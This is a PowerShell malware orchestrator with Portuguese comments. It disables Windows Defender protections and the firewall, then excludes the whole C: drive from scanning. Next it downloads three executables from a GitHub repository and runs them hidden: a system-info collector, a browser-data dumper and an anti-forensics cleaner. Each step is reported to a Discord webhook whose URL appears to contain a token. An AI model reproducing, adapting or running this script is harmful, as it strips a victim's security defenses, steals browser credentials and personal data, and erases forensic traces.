# orchestrator.ps1
# Script unificado: desativa Defender, executa coletas, restaura e limpa
# Execute como Administrador (já estará elevado)

$TempFolder = $env:TEMP

# ==================================================
# 0. WEBHOOK (para feedback, opcional)
# ==================================================
function Send-DiscordWebhook {
    param([string]$Message)
    $webhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
    $escaped = $Message -replace '"', '\"' -replace "`n", '\n' -replace "`r", '\r'
    $json = "{`"content`":`"$escaped`"}"
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch {}
}

# ==================================================
# 1. DESATIVA O DEFENDER (comandos do disable_al)
# ==================================================
Send-DiscordWebhook "🛡️ Desativando bloqueio à primeira vista (1/7)"
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando IOAV (2/7)"
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando escaneamento de scripts (3/7)"
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando envio de amostras (4/7)"
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando MAPS (5/7)"
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue

Send-DiscordWebhook "🔥 Desligando Firewall (6/7)"
netsh advfirewall set allprofiles state off

Send-DiscordWebhook "📅 Adicionando exclusão do C:\ (7/7)"
$drive = [char]67 + ':\'
Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue

# ==================================================
# 2. BAIXA E EXECUTA SYSINFO.EXE
# ==================================================
Send-DiscordWebhook "🖥️ Executando sysinfo.exe..."
$sysinfoUrl = "https://github.com/gsfv/tro.j/raw/refs/heads/main/sysinfo.exe"
$sysinfoPath = "$TempFolder\sysinfo.exe"
(New-Object Net.WebClient).DownloadFile($sysinfoUrl, $sysinfoPath)
Start-Process -FilePath $sysinfoPath -Wait -WindowStyle Hidden

# ==================================================
# 3. BAIXA E EXECUTA DUMPBROWSERDATA.EXE
# ==================================================
Send-DiscordWebhook "🌐 Executando dumpbrowserdata.exe..."
$dumpUrl = "https://github.com/gsfv/tro.j/raw/refs/heads/main/dumpbrowserdata.exe"
$dumpPath = "$TempFolder\dumpbrowserdata.exe"
(New-Object Net.WebClient).DownloadFile($dumpUrl, $dumpPath)
Start-Process -FilePath $dumpPath -Wait -WindowStyle Hidden

# ==================================================
# 4. BAIXA E EXECUTA ANTIFORENSICS.EXE (restaura + limpa)
# ==================================================
Send-DiscordWebhook "🧹 Executando antiforensics.exe..."
$antiUrl = "https://github.com/gsfv/tro.j/raw/refs/heads/main/antiforensics.exe"
$antiPath = "$TempFolder\antiforensics.exe"
(New-Object Net.WebClient).DownloadFile($antiUrl, $antiPath)
Start-Process -FilePath $antiPath -Wait -WindowStyle Hidden

Send-DiscordWebhook "✅ Processo concluído!"
